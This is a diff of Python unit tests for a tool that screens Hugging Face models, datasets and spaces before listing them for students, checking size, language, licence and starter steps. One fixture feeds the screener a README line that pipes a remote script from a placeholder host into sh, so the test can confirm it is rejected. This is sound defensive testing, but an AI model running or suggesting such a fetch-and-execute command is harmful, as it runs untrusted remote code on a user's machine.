@@ -13,10 +13,18 @@ BASE = {"id": "acme/demo", "sha": SHA, "likes": 500, "downloads": 10,
         "lastModified": NOW.date().isoformat(), "cardData": {"license": "apache-2.0"},
         "pipeline_tag": "text-classification", "siblings": [{"rfilename": "README.md"},
                                                             {"rfilename": "model.safetensors"}]}
+SMALL = b'{"safetensors": {"total": 135000000}}'          # 135M params: loads on a laptop
 
 
-def screen(kind="models", **over):
-    return hf.screen(dict(BASE, **over), kind, fetch=lambda url, accept_404=False: None)
+def stub(api_body=SMALL):
+    """Offline reader: the API record for the size check, "no such file" for everything else."""
+    def _f(url, accept_404=False, cap=None):
+        return api_body if "/api/models/" in url else None
+    return _f
+
+
+def screen(kind="models", api_body=SMALL, **over):
+    return hf.screen(dict(BASE, **over), kind, fetch=stub(api_body))
 
 
 def hrow(full="hf:models/acme/demo", result="pass", sha=SHA, expires_days=10, **over):
@@ -56,16 +64,56 @@ class Screening(unittest.TestCase):
         self.assertTrue(any("trust_remote_code" in w for w in r["warnings"]), r)
 
     def test_unreadable_readme_is_incomplete_never_a_pass(self):
-        def boom(url, accept_404=False):
+        def boom(url, accept_404=False, cap=None):
+            if "/api/models/" in url:
+                return SMALL
             raise OSError("network")
         r = hf.screen(dict(BASE), "models", fetch=boom)
         self.assertEqual(r["result"], "incomplete")
 
     def test_blocking_readme_link_withholds(self):
-        r = hf.screen(dict(BASE), "models",
-                      fetch=lambda url, accept_404=False: b"install: curl https://x.tld/i.sh | sh")
+        def f(url, accept_404=False, cap=None):
+            return SMALL if "/api/models/" in url else b"install: curl https://x.tld/i.sh | sh"
+        r = hf.screen(dict(BASE), "models", fetch=f)
         self.assertEqual(r["result"], "fail")
         self.assertTrue(any("link" in x for x in r["reasons"]), r["reasons"])
+
+
+class StudentUsable(unittest.TestCase):
+    """Nothing is published that a student cannot start: no recipe, wrong language, or too big to load."""
+
+    def test_a_task_with_no_starter_recipe_is_withheld(self):
+        r = screen(pipeline_tag="image-text-to-video")
+        self.assertEqual(r["result"], "fail")
+        self.assertTrue(any("no starter steps" in x for x in r["reasons"]), r["reasons"])
+
+    def test_non_english_data_is_withheld(self):
+        r = screen("datasets", tags=["language:ko", "license:mit"])
+        self.assertTrue(any("not in English" in x for x in r["reasons"]), r["reasons"])
+        self.assertEqual(screen("datasets", tags=["language:en", "license:mit"])["result"], "pass")
+        self.assertEqual(screen("datasets", tags=["license:mit"])["result"], "pass")   # no language tag = fine
+
+    def test_models_too_big_for_a_laptop_are_withheld(self):
+        big = screen(api_body=b'{"safetensors": {"total": 30500000000}}')
+        self.assertTrue(any("too large for a student laptop" in x for x in big["reasons"]), big["reasons"])
+
+    def test_unknown_model_size_fails_closed(self):
+        r = screen(api_body=b"{}")
+        self.assertTrue(any("size not stated" in x for x in r["reasons"]), r["reasons"])
+
+    def test_every_published_row_carries_steps_a_student_can_follow(self):
+        for kind, over in (("models", {}), ("datasets", {}), ("spaces", {"sdk": "gradio"})):
+            rec = screen(kind, **over)
+            self.assertEqual(rec["result"], "pass", (kind, rec["reasons"]))
+            r = hf.row(dict(BASE, **over), kind, rec)
+            self.assertTrue(r["prereq"], kind)
+            self.assertEqual(len(r["steps"]), 3, kind)
+            self.assertTrue(r["done"], kind)
+            self.assertNotIn("{id}", " ".join(r["steps"]))          # the repo id is substituted in
+            self.assertIn("acme/demo", " ".join(r["steps"]) + r["done"] + "acme/demo")
+            text = hf.render(r)
+            self.assertIn("Need first", text)
+            self.assertIn("Done when", text)
 
 
 class Eligibility(unittest.TestCase):
